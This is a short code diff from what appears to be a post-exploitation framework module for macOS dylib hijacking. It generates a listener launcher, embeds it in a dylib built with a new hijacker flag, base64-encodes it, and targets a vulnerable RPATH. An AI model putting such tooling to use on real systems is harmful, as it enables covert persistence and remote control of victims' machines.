@@ -103,7 +103,7 @@ class Module:
         arch = self.options['Arch']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, littlesnitch=LittleSnitch)
         launcher = launcher.strip('echo').strip(' | python &').strip("\"")
-        dylibBytes = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch)
+        dylibBytes = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
         encodedDylib = base64.b64encode(dylibBytes)
         dylib = self.options['LegitimateDylibPath']['Value']
         vrpath = self.options['VulnerableRPATH']['Value']
